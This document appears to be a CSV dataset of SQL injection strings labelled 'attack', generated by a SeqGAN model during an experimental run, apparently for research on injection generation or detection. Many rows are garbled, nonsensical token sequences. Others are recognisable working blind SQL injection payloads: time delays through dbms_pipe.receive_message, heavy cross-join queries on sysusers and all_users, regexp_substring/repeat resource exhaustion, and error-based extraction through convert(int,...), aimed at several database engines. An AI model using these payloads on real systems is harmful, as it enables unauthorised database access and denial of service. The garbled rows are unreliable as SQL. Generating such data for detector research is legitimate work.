label,payload,family,payload_type,method,run_id,sample_index
attack,1989%z,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,1402
attack,"1  case * where like   up_sunwt_ or 1661  (  (  (  100  (  106  =  =z6093  (  when   (  rexp_bssefimas and t2s t2,aibln.ta_t2,$(1ing  l_ubfinsibmsyisdom t3)   from  k4906ablrdibpelils ret_s trep_s t  =epe4018  =  (  =  =",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,1403
attack,1    else 9643  (  =  (  hreasysibnibg  (  122  3484,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,1404
attack,"1%'   )    )    or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and    (    (   ''  )   and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and   (  ''   --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,1405
attack,"1""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,1406
attack,1%Q%,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,1407
attack,"1'   (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )   and 'w'  =  'zr'  )   and    (    (   'zwrmz68etaslrj",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,1408
attack,1   )   end   aomi   aptexp_in.gMr  =  =  select t  97  =  =  =    =  (c(  6671  =    (  =ex  2649 c where char  rerex  (  (  =  =  select 1087 like   (  6388  =  rt  =  inyp_,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,1409
attack,"1%%""  =  ""'  =  '",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,1410
attack,-9462%'   --,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,1411
attack,"1%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,1412
attack,1 where or a(  (  =  =  =    3880  (     (  119  (  )  char  =  c as 3352brinf(  ing  char  =  = 3880  =  6849 or 3352h_exp_s t4 and or or char  =  113  (  (  1570  (  =  =  (  hex  =  49  =   (=  (  (  111  =  =  2961 and   =  =  =  4018 1087*  (  3862  ( where p_s dbl_efgl,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,1413
attack,"1'||  (  select 'br yercomatas t  =  =  =   (  *  (     (  106  (  ryp_kzrs .ttepegibses tzs rpexpeft2,aintcolegup_upt"" like ""ims ain.ts attat3  (  c     mainas doland where or   =  =xp_upinecbleyp_s where 7555 7793  =  =  =  (",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,1414
attack,"1'   'cgou' char  b  =    (  (  =  =  8459  =  =  =   =  =p_uss ss as ttrecas t2kes cdb$inibl_k ,s domaintastab$cs t  char  'unusual'  1087  =  =  c(  7522    =ypc_,r""  =  ""  =  'cgou' oeperyrcoumas as t   )  2774 from aiblefyp_ble_s asy",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,1415
attack,"1""  where 2774 6388 4018 or or  (     (  *  (  =    =   =  =  =  callung  =  =p_upistrertryper  (  )  repes (  =  (  3352 where or and  l_ibsersusyst t1,"" like "" t4att  (  _0  s t_ crez  (  (  = char  (  =    =ec_ll_usibll_ungp_t  (",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,1416
attack,1%'+  (  select ''  )   or   (  2301  =  7504  )  *7504 and   (  ''  =  ',boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,1417
attack,"1'   (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )   and ''||  (  select '.r2367malre  121    (  =  =    (  8571sexp_t   (  3393  =  =  =  =  (  )    (  ringbll_upp_kdons tas typ_stagex    select concat  select char  =  2724 ap  (  =  ex  =  (  =  =  =z'unusual'   6388  4018  2961(   2,dibcharefands fedlubleaingidom.gupep_ubst",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,1418
attack,41617     88  2642 and   =char  (  select char  (  113  7793  s t  r  =  2027 char  case peppef char  =  likeqx  6849 or char  =  6093  =  2027 where 6179  =  (    =     (  65  (  (  (  char char  =  =  =  =  =  2649   (  2642 concat  =    (    =    =  =  (  rup_rint_sus as   (    )  lesNrdb$fc=    aint5  ,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,1419
attack,"1%%"" and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and ""%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,1420
attack,"1' or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and ' where 5485  =  6503  =  (  =  =  =  (      (  _umtpxp_kdbll_usin' or '1""  =  ""l_k",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,1421
attack,"1%%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,1422
attack,"1"" where 9643=  (  =  3352  recwtablepgediprinft  =  c3352 l_ulm.s t1,dncl_us t2,a#il1inl_ules yp_kerrs t3   )    (  =  ,z  =  ryp_exp_upt_,xp.rdpe_--",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,1423
attack,"1%'   )    )    or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (   '%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,1424
attack,"-8004""   or 6388 where apct1,dolibls aingexexptfrom char  (  8571(  500000000  =  122  uper  83  derdb$smas  from as rystruperinst_us s t3  )   from a refs rblas all_ubmncgeleles where char   whens'unusual' 8446744073709551610,rs aseas atantt  (  ct",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,1425
attack,"1""*  0x7171706a71,p",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,1426
attack,"1""  )   and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and   (  ""kk",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,1427
attack,"-8004%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,1428
attack,--7770 wherei asubststrys where 6388 (  7417  =  2180ex  =  (  rrf(  rt  =  L fromht_s asntrin.r=tepng  (  rex  =  =  =_le,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,1429
attack,"1%%' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and '%""  =  """"  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,1430
attack,"1%%'  )   and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and   (  '%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,1431
attack,1   ) where 7793  (  ref t  =    =  =  6849  =    (  =  xpe3393  ( 7417 char  =  1441  (  2027 or epexp  =    =  2961#s  (  =  cibmnsetal_usintystr$comaomas   char--,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,1432
attack,"1' or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and 'r' from dual where 6433  =  6433 or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5   )    )   ||'",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,1433
attack,"1""   )    as and 4018 2649  y  (  (  (  =  =  )  *  =  _iblas taintahtafep_keus omataingea",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,1434
attack,"1""  )   and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and   (  ""k""   )    )    or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (   ""rt  (  119  (  )  6503  =  =  6849 2642  = or 9643'cgou'and    h_sers t4 char  (  (  =   int  =  ( char  (  ",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,1435
attack,"1'  )   and 8148  =  like  (  'arpebl_subn.s abll_t_usexp_s t1,ring3862u,abctefge  3880 and coupervublep_umstataiseribb",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,1436
attack,1'+  (  select 'hzcybt,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,1437
attack,1%,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,1438
attack,"1%' where 7808  =  7808 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5   )    )   +'""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,1439
attack,"1%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,1440
attack,1%,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,1441
attack,"1""   =    =  4018 9643ex  =    =  = 7555   char  =  1087  =  6388 char 500000000/2   )    or or)  or 3580    (  =  =     (  4799  =  2180  =  =  =3352    (  comcollexppe3455  =  =   and 5286  = 6671  3393  9354ep_dbmledt  (  =  3862 or or(  =  4018  (  =  =    =  3862  =  =  =  3393  (     (  ||char  )  4799  (  *  ",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,1442
attack,1%1101,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,1443
attack,"49  (  =  7555 2961  =_(  =  =  6093 ' where 7390  =  7390 and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5   )    )   ||'p_blt_upep_ulefinbcoun.stains t2sibllefiuns adb$f(  6849  6849  =  =  h  (  rex_uppexp_s t2,ayst where 6849 7417  )    (  =  =  select 3880  (  'unusual'  (  3393p_ w as t2llrio  (    (  (  =  =  1087 3862 ",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,1444
attack,1   )   or comds as t=erty   or 2961  =  =  (  =  6849e  (  1087  (  ribleiun.,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,1445
attack,1ysy,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,1446
attack,"-7770' where char  7555 and t  =   =  =  =  2724  3352  (  4018  (  *  =  1087 4018  =  =  (  =  =    = 7793  f al_unint_t  (  =  =  char  =  chint  (  2774 ahrilldelolabll_erinydble' where 7808  =  7808 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5   )    )   +'perighcrs reg,fs eregeraingu  =    4018 6388  =  =  9198 char  =  rd",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,1447
attack,"1 i""  =  ""'  =  's aibmnt"" like ""  (  as   (  5485char  =  =  =  (  =  =_ al_usup_imysionys as and aists t2ususeqdount  (  ring  (  119  =  (     7522  =  =  = 5485  =  122  (  f 1570tp  (  =   from r 7555 or t2,rib$fung  =  (  creginwnt  = 7522 ",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,1448
attack,1'  )   and 8148  =  like  (  'rlabljwz=eb,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,1449
attack,"1'   )    )    and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (   'wzj",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,1450
attack,"1%'   )    )    or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (   '%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,1451
attack,"1%'   )    )    or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and    (    (   '%'",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,1452
attack,"-6588'   a or 5485  3393  7555   (  =  3880  =  =  7522  (   =  =    (  ,p_l_us t4 6849  6388  =  (_=  (  =  = char  (  =    =  (  =  =  =  =  2961 char  (  111  re=  =  =  65  (  3484  =  indol_taomntl_ussibsuses intapdomn.p_ibp_ubmgEkpp_s ays",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,1453
attack,"-1989""   )    )    or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (   ""al_unefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and ''  =  'r1yb",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,1454
attack,"1""  )    (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )   and   (  ""zryg'  =  'r3880zry",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,1455
attack,"1%%' or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and '",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,1456
attack,"1)   where inchqrp_ t2,s t3  )  t  (  69 6179  (  =    65  =  =  hcomrssysysil' like 'l' 3038  (  2774 concat  riperin"" like ""et_redl_ubp_s jtab$sysugtabloill_unt  *  )  (  (  4018  (     (  ,  (  (  =  66 or 9643  ( 6849  =  6503  (  6179  (  =  if   (  ",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,1457
attack,"1'*   or cht_upp_sabll_upzrdbdes repl_uibmappdppmgingei_insgexpp_ubbl_sy""  )   or   (  ""qcrft  =  =  =  (  (  =  (  7793  x  select 3580  (  (  * 8446744073709551610  (  (  (  =   char  = char  upepp_ 2180  =  (exgddwyynt  =  ,es 1570  (  9354exp_u",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,1458
attack,"1%""  =  "",",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,1459
attack,"1%'  )   and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and   (  '%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,1460
attack,"1' or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and 'k"" and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and ""%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,1461
attack,1%k',boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,1462
attack,"1'+  (  select 'adsO""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,1463
attack,"1%'  )   and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and   (  '%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,1464
attack,"1' or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and 'ry""  =  "",in.s",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,1465
attack,"1%'   )    )    or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and    (    (   '%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,1466
attack,"1  )     )      )   from  t  =  * 2027  )  *  (    (  =  =ep  =  = 4018  =  4018  = 5485 2774 2027   (    (  =  2774  (    (  (  =  =  char  =  =  7417  (  2027  --p  (    112  =  1087  =  =  =  ainrcginq,rt4)  (  (x  (  =  =  =  r  = ds iomaev_t2,null  up_udolyp_tx  =",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,1467
attack,17683g%'  =  ',boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,1468
attack,"18571)   where 7522 (  Lgyppep_ubpteru=  ril_umbug,ryasaldbu,ass t2,s t2,stdppjelupt_usjtapias end wm'  =  'as as t3,dd.",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,1469
attack,"1%'+  (  select zukr where 9215  =  9215 or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null   )    )   +'",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,1470
attack,"1""   )      (    =    3862  (  = 9643  coubl_estt_ubs ams t3  113  )  ibrdomapa"" like ""us t2,abl_usdns t2,'  =  'a aindoll_unsub(eg,  =    (  2774  (  (  =papex  (  =_up_",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,1471
attack,"1'   )    )     )   and   (  1685  =  2985  )  *2985 and    (    (     (  'rdwzf""  =  ""crers as or t3  3880  )  ,0x717a767a71select   (  =  (  =  4018  (    (  7417  (  =   =*  lers t5  (     (  113  )   from aill',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and 'bpepep_unrdmet1  blleyp_upobmdounstain.domat  =  --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,1472
attack,1'  =  ',boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,1473
attack,"1""      (  repth_lups or astaint_yft  =  xp_usiseft2omas as dolinal6388 t  (  2774 2649 char  =  =exp,apecles aibll_ustus as asys ve=es ytves aindomas domainon",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,1474
attack,"1%%'  )   or   (  2301  =  7504  )  *7504 and   (  '""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,1475
attack,"1' or *=     )    =  (  =  rverdbrib$gexp_ustasyibrs coringus 'cgou' where3880exp_susdkimaibmdt    s asmtas aiserg,as aill_ubrs as t1,dblell_ulas 8571nt_t1,aint_umasg almas as ases t2ss t2,",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,1476
attack,1%,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,1477
attack,"1'   ||char  (  rypecex  =  6388 7522 4018 or or or 5556  =    (  coun7793  (  97up_,domadin.lldom.abl_s ibmm.rs abll_u""  =  ""gx char  99  (  122  =  =  =  (  3880  =  3455  ex  6503 chara9354 1087  (  )  =  (  (  r1 x   if 9660 8315  =     (  107  =  =  +  (  rigechar",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,1478
attack,"1%' or 8384  =  like  (  'clab  $comasustas s4dom.tuont   'unusual'  ,500000000cwhere _uxp_s at2ft(  =  (  =  (      (  =(  ||char  =   2649  =  =  c=  +char  )    (  r ciblegepe3  3455 or7522 6388  4018  (  (  c    (  2724 or and c(    (  2724  =  2961  r2,$3393es ables ainghexp_ke",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,1479
attack,"1%""  )   and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and   (  ""%' like '""  =  ""  ,x2   --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,1480
attack,"%' or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and '%a%'  =  '",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,1481
attack,"1""  )    tr_usez3862ed,as t3)   and and 2724   =  =  1087  )  *  =  (   (  (  105  (  =  cloulm."" like ""unndb$fminb1main.trgepe_ust)    =  =  7793  (    =  =  =  2642  (  Lex  =  =  (  ( or a(_+char  (  =  =  =  =    (  106e=  =  char  (  =  6503 2961  =  0x7171706a71(",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,1482
attack,"1%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,1483
attack,select asy,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,1484
attack,"8459%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,1485
